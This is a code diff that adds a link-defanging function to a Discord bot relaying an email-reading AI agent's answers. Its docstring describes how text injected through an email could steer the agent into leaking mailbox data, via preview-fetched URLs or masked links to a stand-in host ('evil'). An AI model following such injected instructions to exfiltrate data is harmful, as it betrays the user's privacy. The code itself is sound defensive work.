@@ -16,6 +16,7 @@ that steered the agent can change what is proposed, but not how it is shown.
 from __future__ import annotations
 
 import logging
+import re
 from dataclasses import dataclass, field
 
 import aiohttp
@@ -84,6 +85,27 @@ def footer(reply: Reply) -> str:
     if not reply.ok and reply.stop:
         parts.append(reply.stop)
     return "-# " + " · ".join(parts)
+
+
+_MASKED = re.compile(r"\[([^\]\n]*)\]\(\s*<?(https?://[^\s)>]+)>?\s*\)")
+_BARE = re.compile(r"(?<![<(])(https?://[^\s<>)\]]+)")
+
+
+def defang(answer: str) -> str:
+    """Make every link in an answer visible and inert until clicked.
+
+    The answer can be steered by an email the agent read. Two ways that text
+    could move data out of the house without a ✅:
+      * a URL with mailbox contents in its query string, which Discord's
+        crawler fetches to build a preview, with no click needed. Wrapping
+        it in <…> suppresses the preview (the messages also pass
+        suppress_embeds);
+      * a masked link, [harmless text](https://evil/?d=…), which hides where
+        a click goes. It is rewritten as `text (<url>)`, so the destination
+        is on screen before anyone clicks.
+    """
+    answer = _MASKED.sub(lambda m: f"{m.group(1)} (<{m.group(2)}>)", answer)
+    return _BARE.sub(r"<\1>", answer)
 
 
 def fact_of(proposal: Proposal) -> str | None:
